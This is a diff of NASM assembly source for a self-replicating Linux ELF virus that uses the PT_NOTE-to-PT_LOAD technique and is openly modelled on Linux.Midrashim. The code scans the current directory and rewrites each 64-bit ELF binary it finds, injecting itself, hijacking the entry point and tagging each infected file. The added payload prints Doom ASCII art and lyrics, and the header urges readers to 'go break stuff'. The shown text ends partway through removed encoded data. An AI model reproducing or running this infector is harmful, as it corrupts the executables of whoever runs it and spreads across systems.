@@ -1,79 +1,116 @@
-;; -*- mode: nasm; fill-column: 80; comment-column: 80; -*-
+;-----------------------------------------------------------------------------------insert-coin--;
+; A case study and implementation of the PT_NOTE->PT_LOAD infector, based on the tmp0ut's 1.01   ;
+; article and highly ~~copied from~~ inspired by Linux.Midrashim and with some notes of          ;
+; Linux.Kropotkine.                                                                              ;
+;                                                                                                ;
+; It mostly works the same as Midrashim but has some smol differences, such as mapping the       ;
+; infected file into memory using mmap() and... that's it (. ᴗ .)                                ;
+; However it does not detect if it's on a first run, nor is the payload encrypted. May that      ;
+; change during our lifetime                                                                     ;
+;                                                                                                ;
+; Payload doesn't bite, just prints the lyrics to "I, dogma", the opening to the Doom (2016)     ;
+; soundtrack, pretty random but it's a cool intro                                                ;
+;                                                                                                ;
+; compile with> nasm -f elf64 infector.s -o infector.o; ld -o infector infector.s                ;
+;                                                                                                ;
+; Same shit as the other ones, use it at your own risk and go break stuff <3                     ;
+;------------------------------------------------------------------------------------------------;
 
-%define SYS_EXIT        60
-%define SYS_GETDENTS64  217
-%define SYS_OPEN        2
-%define SYS_CLOSE       3
-%define SYS_FSTAT       5
-%define SYS_MMAP        9
-%define SYS_MSYNC       26
-%define SYS_MUNMAP      11
-%define SYS_WRITE       1
-%define SYS_PREAD64     17
-%define SYS_FTRUNCATE   77
-
-
-%define OFF_DIRENT_DRECLEN  16                                   ; dirent.d_reclen
-%define OFF_DIRENT_DTYPE    18                                   ; dirent.d_type
-%define OFF_DIRENT_DNAME    19                                   ; dirent.d_name
-
-%define STAT_OFF_STSIZE  48                                      ; stat.st_size
-
-%define STDOUT    1
-%define O_RDONLY  0
-%define O_RDWR    2
-%define DT_REG    8
-%define MS_SYNC   4
-
-%define ST_DIRENT_SIZE_OFF  1024                                 ; long
-%define ST_OPEN_FILE_FD     1032                                 ; int
-%define ST_OPEN_FILE_STAT   1040                                 ; 144 bytes
-%define ST_OPEN_FILE_ADDR   1184                                 ; ptr
-%define ST_FILE_EHDR        1192                                 ; 16 bytes (ehdr)
-%define ST_FILE_PHDR_VADDR  1200                                 ; ptr
-%define ST_PAYLOAD_ADDR     1500                                 ; char[]
-
-%define PROT_READ   1
-%define PROT_WRITE  2
-%define MAP_SHARED  1
-
-%define PT_LOAD     1
-%define PT_NOTE     4
-%define ELFCLASS64  2
-%define PF_X        1
-%define PF_R        4
-
-%define OFF_EHDR_IDENT_CLASS  4                                  ; elf.ehdr.e_ident[4]
-%define OFF_EHDR_IDENT_PAD    9                                  ; elf.ehdr.e_ident[9]
-%define OFF_EHDR_ENTRY        24                                 ; elf.ehdr.e_entry
-%define OFF_EHDR_PHOFF        32                                 ; elf.ehdr.e_phoff
-%define OFF_EHDR_PHENTSIZE    54                                 ; elf.ehdr.e_phentsize
-%define OFF_EHDR_PHNUM        56                                 ; elf.ehdr.e_phnum
-
-%define OFF_PHDR_FLAGS        4                                  ; elf.phdr.p_flags
-%define OFF_PHDR_OFF          8                                  ; elf.phdr.p_offset
-%define OFF_PHDR_VADDR        16                                 ; elf.phdr.p_vaddr
-%define OFF_PHDR_PADDR        24                                 ; elf.phdr.p_paddr
-%define OFF_PHDR_FILESZ       32                                 ; elf.phdr.p_paddr
-%define OFF_PHDR_MEMSZ        40                                 ; elf.phdr.p_paddr
-
+;-------------- syscalls ---------------;
+%define SYS_WRITE       1               ;
+%define SYS_OPEN        2               ;
+%define SYS_CLOSE       3               ;
+%define SYS_FSTAT       5               ;
+%define SYS_MMAP        9               ;
+%define SYS_MUNMAP      11              ;
+%define SYS_PREAD64     17              ;
+%define SYS_MSYNC       26              ;
+%define SYS_EXIT        60              ;
+%define SYS_FTRUNCATE   77              ;
+%define SYS_GETDENTS64  217             ;
+;---------------- stack ----------------;
+%define ST_DIRENT_SIZE_OFF  1024        ;
+%define ST_OPEN_FILE_FD     1032        ;
+%define ST_FILE_STAT        1040        ;
+%define ST_OPEN_FILE_ADDR   1184        ;
+%define ST_FILE_EHDR        1192        ;
+%define ST_FILE_PHDR_VADDR  1200        ;
+%define ST_PAYLOAD_ADDR     1500        ;
+;--------------- symbols ---------------;
+%define STDOUT      1                   ;
+%define O_RDONLY    0                   ;
+%define O_RDWR      2                   ;
+%define DT_REG      8                   ;
+%define MS_SYNC     4                   ;
+%define PROT_READ   1                   ;
+%define PROT_WRITE  2                   ;
+%define MAP_SHARED  1                   ;
+%define PT_LOAD     1                   ;
+%define PT_NOTE     4                   ;
+%define ELFCLASS64  2                   ;
+%define PF_X        1                   ;
+%define PF_R        4                   ;
+%define TAG         0xdeadc0de          ;
+%define VX_SIZE0    v_stop - _start     ;
+%define VX_SIZE1    VX_SIZE0 + 5        ;
+;--------------- structs ---------------;
+struc dirent                            ;
+.d_ino    resq 1                        ;
+.d_off    resq 1                        ;
+.d_reclen resw 1                        ;
+.d_type   resb 1                        ;
+.d_name   resb 1 ; variable length arr  ;
+endstruc                                ;
+                                        ;
+struc stat                              ;
+.st_unused0 resb 48                     ;
+.st_size    resq 1                      ;
+endstruc                                ;
+                                        ;
+struc e_ehdr                            ;
+.e_ident_mag   resb 4                   ;
+.e_ident_class resb 1                   ;
+.e_ident_      resb 4                   ;
+.e_ident_pad   resb 7                   ;
+.e_type        resw 1                   ;
+.e_machine     resw 1                   ;
+.e_version     resd 1                   ;
+.e_entry       resq 1                   ;
+.e_phoff       resq 1                   ;
+.e_shoff       resq 1                   ;
+.e_flags       resd 1                   ;
+.e_ehsize      resw 1                   ;
+.e_phentsize   resw 1                   ;
+.e_phnum       resw 1                   ;
+.e_shentsize   resw 1                   ;
+.e_shnum       resw 1                   ;
+.e_shstrndx    resw 1                   ;
+endstruc                                ;
+                                        ;
+struc e_phdr                            ;
+.p_type   resd 1                        ;
+.p_flags  resd 1                        ;
+.p_offset resq 1                        ;
+.p_vaddr  resq 1                        ;
+.p_paddr  resq 1                        ;
+.p_filesz resq 1                        ;
+.p_memsz  resq 1                        ;
+.p_align  resq 1                        ;
+endstruc                                ;
+;---------------------------------------;
+    
 global _start
 section .text
 
 _start:
-v_start:
     push rdx
     push rsp
     sub  rsp, 5000
     mov  r15, rsp
 
-load_dir:
-    ; calls getdents64 to get a list of all the files of the current directory. does not recurse.
-    ;
-    ; NOTE(phos): i believe it won't work on directories with a considerable amount of files
-    ; (e.g. /bin/) since it's only allocating 1024 bytes for the array of results.
+read_dir:
     push "."
-    mov rax, SYS_OPEN
+    mov rax, SYS_OPEN                             ; open() current directory
     mov rdi, rsp
     mov rsi, O_RDONLY
     xor rdx, rdx
@@ -81,429 +118,243 @@ load_dir:
 
     pop  rdi
     test rax, rax
-    js   v_stop
-    
+    js   infected                                     
+
     mov rdi, rax
     lea rsi, [r15]
     mov rdx, 1024
-    mov rax, SYS_GETDENTS64
+    mov rax, SYS_GETDENTS64                       ; getdents64() all the files in the directory,
+                                                  ; non recursively
     syscall
 
     test rax, rax
-    js   v_stop
+    js   infected
 
-    mov qword [r15 + ST_DIRENT_SIZE_OFF], rax
+    mov qword [r15+ST_DIRENT_SIZE_OFF], rax
 
     mov rax, SYS_CLOSE
     syscall
 
     xor rcx, rcx
-file_loop:
-    ; loop over each dirent structure
+.loop_dirent:
     push rcx
 
-    cmp byte [r15 + rcx + OFF_DIRENT_DTYPE], DT_REG
-    jne file_loop_continue      ; if the file is not a regular file, skip it
+    cmp byte [r15+rcx+dirent.d_type], DT_REG      ; check if the file is a regular file
+    jne .loop_continue                            ; skip it otherwise
 
-open_file:
+.open_file:
     mov rax, SYS_OPEN
-    lea rdi, byte [r15 + rcx + OFF_DIRENT_DNAME]
+    lea rdi, byte [r15+rcx+dirent.d_name]
     mov rsi, O_RDWR
     xor rdx, rdx
     syscall
 
     test rax, rax
-    js   file_loop_continue
-    mov dword [r15 + ST_OPEN_FILE_FD], eax
+    js   .loop_continue
+    mov dword [r15+ST_OPEN_FILE_FD], eax          ; store file FD in the stack
 
     mov rdi, rax
-    lea rsi, qword [r15 + ST_FILE_EHDR]
+    lea rsi, qword [r15+ST_FILE_EHDR]
     mov rdx, 16
     mov r10, 0
-    mov rax, SYS_PREAD64
+    mov rax, SYS_PREAD64                          ; read its first 16 bytes to look for an ELF
+                                                  ; header
     syscall
 
     test rax, rax
-    js   close_file
+    js   .close_file
     
-is_elf:
-    cmp dword [r15 + ST_FILE_EHDR], 0x464c457f
-    jne close_file
+.is_elf:
+    cmp dword [r15+ST_FILE_EHDR], 0x464c457f
+    jne .close_file
 
-is_x64:
-    cmp byte [r15 + ST_FILE_EHDR + OFF_EHDR_IDENT_CLASS], ELFCLASS64
-    jne close_file
+.is_x64:
+    cmp byte [r15+ST_FILE_EHDR+e_ehdr.e_ident_class], ELFCLASS64
+    jne .close_file
 
-is_infected:
-    cmp dword [r15 + ST_FILE_EHDR + OFF_EHDR_IDENT_PAD], 0xdeadc0de
-    je  close_file
+.is_infected:
+    cmp dword [r15+ST_FILE_EHDR+e_ehdr.e_ident_pad], TAG
+    jne process_file
 
-process_file:
-    ; file is valid up to this point, which means we gotta infect the shit out
-    ; of it
+.close_file:
+    mov rax, SYS_CLOSE
+    mov rdi, qword [r15+ST_OPEN_FILE_FD]
+    syscall
 
-    mov edi, dword [r15 + ST_OPEN_FILE_FD]
-    lea rsi, qword [r15 + ST_OPEN_FILE_STAT]
+.loop_continue:
+    pop rcx
+    add cx,  word [r15+rcx+dirent.d_reclen]
+    cmp rcx, [r15+ST_DIRENT_SIZE_OFF]
+    jne .loop_dirent
+    jmp infected
+
+process_file: ; file is valid up to this point, so gotta infect the shit out of it
+.get_file_size:
+    mov edi, dword [r15+ST_OPEN_FILE_FD]
+    lea rsi, qword [r15+ST_FILE_STAT]
     mov rax, SYS_FSTAT
     syscall
 
     test rax, rax
-    js close_file
+    js .close_file
     
-    ; truncate the file to include the size of the virus so it can be mmap()'ed
-    mov rsi, qword [r15 + ST_OPEN_FILE_STAT + STAT_OFF_STSIZE]
-    add rsi, v_stop - v_start + 5
-    ; edi already contains the file offset
+.truncate_file: ; truncate the file to include the size of the virus
+    mov rsi, qword [r15+ST_FILE_STAT+stat.st_size]
+    add rsi, VX_SIZE1
     mov rax, SYS_FTRUNCATE
     syscall
 
     test rax, rax
-    jnz close_file
+    jnz .close_file
 
-    ; mmap() the file
+.map_file:
     xor rax, rax
     mov rax, SYS_MMAP
     mov rdi, 0
-    ; rsi already contains the file size
     mov rdx, PROT_READ | PROT_WRITE
     mov r10, MAP_SHARED
-    mov r8,  qword [r15 + ST_OPEN_FILE_FD]
+    mov r8,  qword [r15+ST_OPEN_FILE_FD]
     mov r9,  0
     syscall
 
-    ; test rax for the range between -1=..=-4095, the error range
-    test rax, rax
-    jns  open_file_end
+    test rax, rax                                 ; test rax for the range -1=..=-4095
+    jns  .open_file_end                           ; the syscall errno range
     cmp  rax, -4095
+    jge .close_file                               ; technically if mmap() fails, the file should be
+                                                  ; truncated back to its original size, yet I'm
+                                                  ; lazy (≧ヘ≦)
 
-    ; technically if mmap() fails, the file should be truncated back to its
-    ; original size, yet I'm lazy (≧ヘ≦)
-    jge  close_file
-
-open_file_end:
-    mov qword [r15 + ST_OPEN_FILE_ADDR], rax
-    mov r14, rax
-
-    ; store the original entry point for later use
-    xor r13, r13
-    mov r13, qword [r14 + OFF_EHDR_ENTRY] 
+.open_file_end:
+    mov r14, rax                                  ; store the mmap()ed address on r14
+    mov r13, qword [r14+e_ehdr.e_entry]           ; store the original entrypoint on r13
     xor rcx, rcx
-search_ptnote:
-    ; compute the offset from the first phdr to the current phdr
-    xor rax, rax
-    mov ax,  word [r14 + OFF_EHDR_PHENTSIZE]
+
+.search_ptnote:
+    xor rax, rax                                  ; compute offset from the fiest phdr to the curr one
+    mov ax,  word [r14+e_ehdr.e_phentsize]
     mul rcx
 
-    ; add the offset to get to the first phdr
-    add rax, [r14 + OFF_EHDR_PHOFF]
+    add rax, [r14+e_ehdr.e_phoff]                 ; add the offset to get to the first phdr
 
-    cmp dword [r14 + rax], PT_NOTE
-    je  infect_ptnote
+    cmp dword [r14+rax], PT_NOTE
+    je  .infect_ptnote
 
     inc  rcx
-    cmp  cx, word [r14 + OFF_EHDR_PHNUM]                    ; check if rcx == ehdr.phnum
-    je   unmap_file                                         ; if so, no ptnote section in the binary
-    jmp  search_ptnote
+    cmp  cx, word [r14+e_ehdr.e_phnum]            ; check if rcx == ehdr.phnum
+    je   .unmap_file                              ; if so, no ptnote section in the binary
+    jmp  .search_ptnote                           ; else continue looking
     
-infect_ptnote:
-    mov dword [r14 + rax], PT_LOAD                          ; change type to PT_LOAD
-    mov dword [r14 + rax + OFF_PHDR_FLAGS], PF_X | PF_R     ; make segment executable
+.infect_ptnote:
+    mov dword [r14+rax], PT_LOAD                  ; change type to PT_LOAD
+    mov dword [r14+rax+e_phdr.p_flags], PF_X|PF_R ; make segment executable
 
-    mov rcx, [r15 + ST_OPEN_FILE_STAT + STAT_OFF_STSIZE]
-    mov [r14 + rax + OFF_PHDR_OFF], rcx ; set the segment offset to the end of the original file
+    mov rcx, [r15+ST_FILE_STAT+stat.st_size]      ; compute end of the original file
+    mov [r14+rax+e_phdr.p_offset], rcx            ; set segment offset to it
 
-    add ecx, 0x0c000000
-    mov qword [r15 + ST_FILE_PHDR_VADDR],   rcx
-    mov qword [r14 + rax + OFF_PHDR_VADDR], rcx      ; set phdr.p_vaddr to a region that is unlikely to be
-                                                     ; mapped by anything else
-    mov qword [r14 + OFF_EHDR_ENTRY], rcx            ; set ehdr.e_entry to the start of the injected segment
-    mov dword [r14 + OFF_EHDR_IDENT_PAD], 0xdeadc0de ; set ident pad to indicate the file has been infected
+    add ecx, 0x0c000000                           ; compute a virtual region that is unlikely to be
+                                                  ; mapped by another segment
+    mov qword [r15+ST_FILE_PHDR_VADDR], rcx       ; store it into stack
+    mov qword [r14+rax+e_phdr.p_vaddr], rcx       ; and set p_vaddr to it
 
-    ; 5 accounts for the `jmp` instruction that needs to be written after the
-    ; end of the injected code to go back to the original entry point
-    add qword [r14 + rax + OFF_PHDR_FILESZ], v_stop - v_start + 5
-    add qword [r14 + rax + OFF_PHDR_MEMSZ],  v_stop - v_start + 5
+    mov qword [r14+e_ehdr.e_entry], rcx           ; set e_entry to the segment's vaddr
+    mov dword [r14+e_ehdr.e_ident_pad], TAG       ; set tag to indicate infection
 
-    ; this thing is called delta offset trick or similar, it computes the offset to the start
-    ; of our code at compile time, which then can be used once the virus is running on infected
-    ; binaries to know our relative position on memory and reference things from that.
+    add qword [r14+rax+e_phdr.p_filesz], VX_SIZE1 ; add the virus size to the segment's filesz
+    add qword [r14+rax+e_phdr.p_memsz],  VX_SIZE1 ; same for the segment's memsz
+
+    ; this thing is called delta offset trick, it computes the offset to the start of our code at
+    ; compile time, which then can be used once the virus is running on infected binaries to know
+    ; our relative position on memory and reference things from that.
     call .delta
 .delta:
     pop rbp
     sub rbp, .delta
 
     mov rcx, 0
-    mov rbx, v_stop - v_start
-    mov r12, qword [r15 + ST_OPEN_FILE_STAT + STAT_OFF_STSIZE]
-copy_virus_into_file:
+    mov rbx, VX_SIZE0
+    mov r12, qword [r15+ST_FILE_STAT+stat.st_size]
+
+.copy_virus: ; write the virus at the end of the file 
     mov rax, r12
     add rax, rcx
-    mov r11b, byte [rbp + v_start + rcx]
-    mov byte [r14 + rax], r11b
+    mov r11b, byte [rbp+_start+rcx]
+    mov byte [r14+rax], r11b
 
     inc rcx
     cmp rcx, rbx
-    jne copy_virus_into_file
+    jne .copy_virus
 
-patch_jmp_into_file:
-    ; compute offset to write the instruction at
+.patch_jmp: ; patch a jmp to the original entrypoint
     mov rax, r12
     add rax, rcx
 
     ; jmp_off = e_entry - (vaddr + (v_stop - v_start) + 5)
-    mov rbx, qword [r15 + ST_FILE_PHDR_VADDR]
-    add rbx, (v_stop - v_start) + 5
+    mov rbx, qword [r15+ST_FILE_PHDR_VADDR]
+    add rbx, VX_SIZE1
     sub r13, rbx
 
-    mov byte  [r14 + rax],     0xe9 ; jump imm32
-    mov dword [r14 + rax + 1], r13d ; offset
+    mov byte  [r14+rax],   0xe9                   ; jump imm32
+    mov dword [r14+rax+1], r13d                   ; imm32
 
-sync_file:
+.resync_file: ; ensure changes are written back to the file
     mov rax, SYS_MSYNC
-    lea rdi, [r15 + ST_OPEN_FILE_ADDR]
-    mov rsi, qword [r15 + ST_OPEN_FILE_STAT + STAT_OFF_STSIZE]
-    add rsi, (v_stop - v_start) + 5
+    mov rdi, r14
+    mov rsi, qword [r15+ST_FILE_STAT+stat.st_size]
+    add rsi, VX_SIZE1
     mov rdx, MS_SYNC
     syscall
 
-unmap_file:
+.unmap_file:
     mov rax, SYS_MUNMAP
-    mov rdi, qword [r15 + ST_OPEN_FILE_ADDR]
-    mov rsi, qword [r15 + ST_OPEN_FILE_STAT + STAT_OFF_STSIZE]
-    add rsi, v_stop - v_start + 5
+    mov rdi, r14
+    mov rsi, qword [r15+ST_FILE_STAT+stat.st_size]
+    add rsi, VX_SIZE1
     syscall
 
-close_file:
-    mov rax, SYS_CLOSE
-    mov rdi, qword [r15 + ST_OPEN_FILE_FD]
+.close_file:
+    jmp read_dir.close_file
+
+infected:
+call .payload
+.msg:
+    db "=================     ===============     ===============   ========  ========",10
+    db "\\ . . . . . . .\\   //. . . . . . .\\   //. . . . . . .\\  \\. . .\\// . . //",10
+    db "||. . ._____. . .|| ||. . ._____. . .|| ||. . ._____. . .|| || . . .\/ . . .||",10
+    db "|| . .||   ||. . || || . .||   ||. . || || . .||   ||. . || ||. . . . . . . ||",10
+    db "||. . ||   || . .|| ||. . ||   || . .|| ||. . ||   || . .|| || . | . . . . .||",10
+    db "|| . .||   ||. _-|| ||-_ .||   ||. . || || . .||   ||. _-|| ||-_.|\ . . . . ||",10
+    db "||. . ||   ||-'  || ||  `-||   || . .|| ||. . ||   ||-'  || ||  `|\_ . .|. .||",10
+    db "|| . _||   ||    || ||    ||   ||_ . || || . _||   ||    || ||   |\ `-_/| . ||",10
+    db "||_-' ||  .|/    || ||    \|.  || `-_|| ||_-' ||  .|/    || ||   | \  / |-_.||",10
+    db "||    ||_-'      || ||      `-_||    || ||    ||_-'      || ||   | \  / |  `||",10
+    db "||    `'         || ||         `'    || ||    `'         || ||   | \  / |   ||",10
+    db "||            .===' `===.         .==='.`===.         .===' /==. |  \/  |   ||",10
+    db "||         .=='   \_|-_ `===. .==='   _|_   `===. .===' _-|/   `==  \/  |   ||",10
+    db "||      .=='    _-'    `-_  `='    _-'   `-_    `='  _-'   `-_  /|  \/  |   ||",10
+    db "||   .=='    _-'          `-__\._-'         `-_./__-'         `' |. /|  |   ||",10
+    db "||.=='    _-'                                                     `' |  /==.||",10
+    db "=='    _-'                                                            \/   `==",10
+    db "\   _-'                                                                `-_   /",10
+    db " `''                                                                      ``' ",10,10
+    db "In the first age, in the first battle",10
+    db "When the shadows first lengthened, one stood",10
+    db "He chose the path of perpetual torment",10
+    db "In his ravenous hatred, he found no peace",10
+    db "And with boiling blood, he scoured the umbral plains,",10
+    db "seeking vengeance against the dark lords who had wronged him",10
+    db "And those that tasted the bite of his sword named him...",10
+    db "The Doom Slayer",10
+    dw 0x0
+    len equ $-.msg
+
+.payload:
+    pop rsi                                       ; pop rip into rsi, which contains the address to .msg
+    mov rdi, STDOUT
+    mov rdx, len
+    mov rax, SYS_WRITE
     syscall
 
-file_loop_continue:
-    pop rcx
-    add cx,  word [r15 + rcx + OFF_DIRENT_DRECLEN]
-    cmp rcx, [r15 + ST_DIRENT_SIZE_OFF]
-    jne file_loop
-
-infected_run:
-    ; 1337 encoded payload, very hax0r
-    call payload
-    msg:
-        ; payload first part
-        db 0x59, 0x7c, 0x95, 0x95, 0x57, 0x9e, 0x9d, 0x57
-        db 0xa3, 0x9f, 0x92, 0x57, 0x93, 0x9e, 0xa8, 0xa3
-        db 0x96, 0x9d, 0x98, 0x92, 0x57, 0x7e, 0x57, 0x98
-        db 0x96, 0x9d, 0x57, 0xa8, 0x92, 0x92, 0x57, 0x96
-        db 0x57, 0x9f, 0xa2, 0x94, 0x92, 0x57, 0x9f, 0x9c
-        db 0x9b, 0x9c, 0x94, 0xa9, 0x96, 0xa7, 0x9f, 0x9e
-        db 0x98, 0x57, 0x89, 0x9c, 0x9d, 0x96, 0x9b, 0x93
-        db 0x57, 0x7a, 0x98, 0x73, 0x9c, 0x9d, 0x96, 0x9b
-        db 0x93, 0x57, 0xa4, 0x96, 0x9b, 0xa0, 0x9e, 0x9d
-        db 0x94, 0x57, 0x99, 0x92, 0xa3, 0xa4, 0x92, 0x92
-        db 0x9d, 0x57, 0xa3, 0x9f, 0x92, 0x57, 0x94, 0xa9
-        db 0x96, 0x9e, 0x9d, 0x57, 0x92, 0x9b, 0x92, 0xa5
-        db 0x96, 0xa3, 0x9c, 0xa9, 0xa8, 0x57, 0x96, 0x9d
-        db 0x93, 0x57, 0xa3, 0xa9, 0x92, 0x92, 0xa8, 0x41
-        db 0x7c, 0x9f, 0x5b, 0x57, 0x9e, 0x95, 0x57, 0x7e
-        db 0x57, 0x9f, 0x96, 0x93, 0x57, 0xa3, 0x9f, 0x92
-        db 0x57, 0x9a, 0x9c, 0x9d, 0x92, 0xae, 0x57, 0x7e
-        db 0x54, 0x93, 0x57, 0x9f, 0x96, 0xa5, 0x92, 0x57
-        db 0x54, 0x92, 0x9a, 0x57, 0x9a, 0x96, 0xa0, 0x92
-        db 0x57, 0x9c, 0x9d, 0x92, 0x57, 0x9c, 0x95, 0x57
-        db 0xa3, 0x9f, 0x9c, 0xa8, 0x92, 0x57, 0x9a, 0x92
-        db 0x5b, 0x57, 0xa3, 0x9f, 0x92, 0x9d, 0x57, 0x7e
-        db 0x54, 0x93, 0x57, 0xa8, 0x92, 0x9d, 0x93, 0x57
-        db 0x9a, 0xae, 0xa8, 0x92, 0x9b, 0x95, 0x57, 0xa3
-        db 0x9c, 0x57, 0xa8, 0xa3, 0x96, 0x9b, 0xa0, 0x57
-        db 0xa3, 0x9f, 0x92, 0x57, 0x9b, 0x96, 0x9d, 0x93
-        db 0xa8, 0x98, 0x96, 0xa7, 0x92, 0x57, 0x96, 0x9d
-        db 0x93, 0x57, 0xa8, 0x98, 0x96, 0xa9, 0x92, 0x57
-        db 0x92, 0xa5, 0x92, 0xa9, 0xae, 0x99, 0x9c, 0x93
-        db 0xae, 0x41, 0x8e, 0x9c, 0xa2, 0x57, 0xa8, 0x92
-        db 0x92, 0x5b, 0x57, 0x54, 0x98, 0x96, 0xa2, 0xa8
-        db 0x92, 0x57, 0x7e, 0x57, 0x94, 0x9c, 0xa3, 0x57
-        db 0xa3, 0x9f, 0x9e, 0xa8, 0x57, 0xa8, 0x9c, 0xa9
-        db 0xa3, 0x57, 0x9c, 0x95, 0x57, 0x95, 0x9e, 0x92
-        db 0x9b, 0x93, 0x57, 0x99, 0x92, 0x9f, 0x9e, 0x9d
-        db 0x93, 0x57, 0x9a, 0x92, 0x5d, 0x57, 0x79, 0x92
-        db 0x98, 0x96, 0xa2, 0xa8, 0x92, 0x5d, 0x5d, 0x5d
-        db 0x57, 0x54, 0x98, 0x96, 0xa2, 0xa8, 0x92, 0x57
-        db 0x7e, 0x54, 0xa5, 0x92, 0x57, 0x94, 0x9c, 0xa3
-        db 0x57, 0xa8, 0xa7, 0x9e, 0xa0, 0x92, 0xa8, 0x41
-        db 0x79, 0x92, 0x98, 0x96, 0xa2, 0xa8, 0x92, 0x57
-        db 0x7e, 0x57, 0x94, 0x9c, 0x57, 0x99, 0x92, 0xa3
-        db 0xa4, 0x92, 0x92, 0x9d, 0x57, 0xa3, 0x9f, 0x92
-        db 0x57, 0xb1, 0x9c, 0x9d, 0x92, 0xa8, 0x5b, 0x57
-        db 0x92, 0xa5, 0x92, 0x9d, 0x57, 0xa4, 0x9f, 0x92
-        db 0x9d, 0x57, 0x7e, 0x54, 0x9a, 0x57, 0x9d, 0x9c
-        db 0xa3, 0x57, 0xa8, 0xa2, 0xa7, 0xa7, 0x9c, 0xa8
-        db 0x92, 0x93, 0x57, 0xa3, 0x9c, 0x41, 0x79, 0x92
-        db 0x98, 0x96, 0xa2, 0xa8, 0x92, 0x57, 0x7e, 0x54
-        db 0x9a, 0x57, 0x96, 0x57, 0xa8, 0xa2, 0xa8, 0xa7
-        db 0x9e, 0x98, 0x9e, 0x9c, 0xa2, 0xa8, 0x57, 0xa7
-        db 0x92, 0xa9, 0xa8, 0x9c, 0x9d, 0x57, 0xa9, 0x92
-        db 0xa7, 0x9c, 0xa9, 0xa3, 0x57, 0x41, 0x76, 0x9d
-        db 0x93, 0x57, 0x9e, 0xa3, 0x54, 0xa8, 0x57, 0xa3
-        db 0x9e, 0x9a, 0x92, 0x57, 0xa3, 0x9c, 0x57, 0x94
-        db 0x9c, 0x57, 0xa8, 0x9f, 0x9c, 0xa7, 0xa7, 0x9e
-        db 0x9d, 0x94, 0x5d, 0x59, 0x41, 0x37, 0x41
-        ; payload second part
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x55
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x55, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x55, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x55, 0x55, 0x55, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x55, 0x55, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x55, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x55, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x55, 0x55, 0x55, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x55
-        db 0x55, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x55, 0x55, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x55, 0x55, 0x55, 0x55, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x55
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x55
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
-        db 0x57, 0x57, 0x57, 0x55, 0x55, 0x55, 0x55, 0x58
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x55
-        db 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
-        db 0x57, 0x57, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x55, 0x55, 0x55, 0x55, 0x57, 0x55
-        db 0x55, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x55
-        db 0x55, 0x55, 0x58, 0x57, 0x57, 0x57, 0x57, 0x41
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x55
-        db 0x55, 0x55, 0x5d, 0x57, 0x57, 0x57, 0x57, 0x57
